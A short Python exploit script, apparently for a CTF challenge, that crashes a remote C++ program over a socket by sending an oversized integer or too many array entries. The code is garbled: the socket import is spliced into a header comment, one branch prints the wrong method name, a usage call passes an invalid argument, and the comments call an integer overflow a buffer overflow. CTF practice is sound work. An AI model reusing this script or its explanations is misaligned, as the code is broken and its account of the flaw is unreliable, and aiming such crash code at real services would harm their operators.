# Sainya-Ranakshetram CTF Buffer Overflow Exploit by Aritro15
# Author: Aritro Sarkar
# Email: sarkararitro15@gmail.com
# Username: Aritro15
# Date: 24th November, 2021
# Overview: This utility will be crash the program running using the code in 
# question.cpp using the following two methods - 
# Method 1: Entering  a value > 2147483647 when the program asks for "Enter a number: "
# Method 2: Enter a number greater then 10 in the prompt "Enter a number: " and then supplying 
# them value greater than 10, in doing so the compiler will terminate the app import socketlication as it's own
# internal protection against buffer overflow

from sys import argv

import re 


def method_1(ip, p, sock):
    sock.connect((ip, p))
    sock.recv(1024)
    sock.send(b"123213798261358746847365436 \r\n")
    sock.recv(1024)
    sock.send(b"cd\r\n")


def method_2(ip, p, sock):
    sock.connect((ip, p))
    sock.recv(1024)
    sock.send(b"11\r\n")
    number = 11
    for _ in range(number):
        sock.recv(1024)
        sock.send(b"11\r\n")


def driver(ip, p, m):
    exp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        if m == 2:
            print("[+] Using method 2 - ")
            print("Method 2 utilizes the vuln in static allocation of an array and not checking the \
                nnumber of times data is enetered in the array, in this case the array can hold at max 10\n \
                 elements, passing it 11 elements will trigger buffer overflow protection of the compiler\n \
                     thus crashing the application.")
            method_2(ip, p, exp_sock)
        else:
            print("[+] Using method 2 - ")
            print("Method 1 utilizes the upper limit of data that can be entered into the 'int' data \n \
                type. In case of c++ and 'int' type varibale can hold number in between -2147483648 and 2147483647 \
                    passing it a value outside it's limits will crash the application")
            method_1(ip, p, exp_sock)
    except Exception:
        print("[-] Cannot crash the application.")
    else:
        print("[-] Application crashed.")
        
    exp_sock.close()


def usage():
    print('[+] Usage: python3 buffer_overflow_exploit.py -h <ipv4> -p <port> -m <Method (1/2)>')
    print("\n[+] Examples -")
    print('python3 buffer_overflow_exploit.py -h 127.0.0.1 -p 8000 -m 1')
    print('python3 buffer_overflow_exploit.py -h 127.0.0.1 -p 8000 -m 2')


if __name__ == "__main__":
    if len(argv) < 5:
        usage()
    else:
        if argv[1] != "-h" or argv[3] != "-p":
            usage()
        else:
            ip = argv[2]
            port = argv[4]
            if not re.search(r"[1-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", ip):
                usage()
            try:
                port = int(port)
            except ValueError:
                usage(0)
            
            try:
                method = argv[6]
            except Exception:
                print("[-] No method specified, defaulting to method 1")
                method = 1
            else:
                try:
                    method = int(method)
                except Exception:
                    print("[-] Incorrect method specified, defaulting to method 1")
                    method = 1
            
            driver(ip, port, method)
